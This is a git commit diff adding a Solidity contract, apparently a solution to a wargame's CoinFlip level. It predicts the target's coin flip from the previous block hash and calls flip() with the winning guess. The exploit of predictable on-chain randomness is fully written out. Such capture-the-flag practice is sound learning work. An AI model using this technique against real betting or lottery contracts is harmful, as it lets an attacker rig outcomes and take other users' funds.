2708a132153f628eb609445fda04ca9a0987c54a
haraslub <lubos.harasta@gmail.com>
2022-01-21 10:23:58 +0100

    Added CoinFlipHackV2

--- contracts/CoinFlipToHackV2.sol
+++ contracts/CoinFlipToHackV2.sol
@@ -4,13 +4,12 @@ pragma solidity ^0.6.0;
 import '@openzeppelin/contracts/math/SafeMath.sol';
 import './CoinFlip.sol';
 
-contract CoinFlipToHack {
+contract CoinFlipToHackV2 is CoinFlip {
 
     using SafeMath for uint256;
 
     CoinFlip public instanceToHack;
-    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
+    
     // get instance of CoinFlip to hack:
     function setInstance(CoinFlip _instanceAddress) public {
         instanceToHack = CoinFlip(_instanceAddress);
@@ -19,17 +18,21 @@ contract CoinFlipToHack {
     // hack the instance, i.e. CoinFlip
     function hackCoinFlip(bool _guess) public {
 
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-        uint256 coinFlip = blockValue.div(FACTOR);
-        bool side = coinFlip == 1 ? true : false;
+        uint256 blockValueHack = uint256(blockhash(block.number.sub(1)));
+        uint256 coinFlipHack = blockValueHack.div(FACTOR);
+        bool sideHack = coinFlipHack == 1 ? true : false;
 
         // if a guess equals to side, use guess to flip()
-        if (side == _guess) {
+        if (sideHack == _guess) {
             instanceToHack.flip(_guess);
         // if a guess does not equal to side, use the opposite guess to flip()
         } else {
             instanceToHack.flip(!_guess);
         }
     }
+
+    function getConsecutiveWins() public view returns(uint256) {
+        return uint256(instanceToHack.consecutiveWins());
+        }
 
 }
